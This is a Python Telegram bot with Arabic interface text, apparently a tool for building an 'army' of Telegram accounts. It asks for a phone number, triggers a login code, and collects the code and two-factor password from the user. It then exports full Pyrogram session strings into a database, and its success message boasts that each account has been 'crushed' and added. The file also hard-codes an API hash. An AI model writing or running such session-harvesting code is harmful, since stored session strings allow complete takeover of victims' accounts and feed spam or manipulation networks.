import os
import telebot
from telebot import types
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded
import psycopg2
from flask import Flask
from threading import Thread

# --- الإعدادات ---
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
API_ID = 26569722 
API_HASH = "90a9314c99544976451664d4c1f964fc"

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
user_data = {}

# --- سيرفر الويب ---
@server.route("/")
def home():
    return "Mikey Center is Alive!", 200

def run_web():
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# --- قاعدة البيانات ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session_string TEXT)")
    conn.commit()
    cur.close()
    conn.close()

init_db()

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ إضافة حساب للجيش", callback_data="add_acc"))
    markup.add(types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"))
    bot.send_message(message.chat.id, "🔥 **مقر مايكي للعمليات** 🔥\n\nأرسل /add لإضافة حساب مباشرة أو استخدم الأزرار:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "add_acc":
        msg = bot.send_message(call.message.chat.id, "📱 الحين أرسل الرقم (مثال: +17539221035):")
        bot.register_next_step_handler(msg, process_phone_step)
    elif call.data == "stats":
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM accounts")
        count = cur.fetchone()[0]
        cur.close()
        conn.close()
        bot.send_message(call.message.chat.id, f"📊 **الجيش الحالي:** `{count}` حساب.")

# --- المعالج الرئيسي للرسايل النصية (بدون أوامر) ---
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # إذا المستخدم أرسل رقم جوال مباشرة بدون ما يضغط زر
    if message.text.startswith('+'):
        process_phone_step(message)
    else:
        bot.reply_to(message, "تبي تضيف حساب؟ اضغط الزر فوق أو أرسل الرقم يبدأ بـ +")

# --- خطوات إضافة الحساب ---
def process_phone_step(message):
    phone = message.text.strip()
    chat_id = message.chat.id
    
    bot.send_message(chat_id, f"⏳ جاري فحص الرقم {phone}...")
    
    client = Client(f"temp_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        client.connect()
        code_info = client.send_code(phone)
        user_data[chat_id] = {'phone': phone, 'client': client, 'hash': code_info.phone_code_hash}
        msg = bot.send_message(chat_id, "📩 أرسل الكود اللي وصلك:")
        bot.register_next_step_handler(msg, process_code_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {e}")

def process_code_step(message):
    chat_id = message.chat.id
    code = message.text.strip()
    if chat_id not in user_data: return

    data = user_data[chat_id]
    try:
        data['client'].sign_in(data['phone'], data['hash'], code)
        save_session(message, data['client'], data['phone'])
    except SessionPasswordNeeded:
        msg = bot.send_message(chat_id, "🔐 أرسل كلمة السر:")
        bot.register_next_step_handler(msg, process_password_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {e}")

def process_password_step(message):
    chat_id = message.chat.id
    password = message.text.strip()
    data = user_data.get(chat_id)
    try:
        data['client'].check_password(password)
        save_session(message, data['client'], data['phone'])
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ بالسر: {e}")

def save_session(message, client, phone):
    string = client.export_session_string()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, string))
    conn.commit()
    cur.close()
    conn.close()
    bot.send_message(message.chat.id, f"✅ الحساب {phone} تم سحقه وضمه للجيش!")
    del user_data[message.chat.id]

if __name__ == "__main__":
    Thread(target=run_web).start()
    bot.infinity_polling()
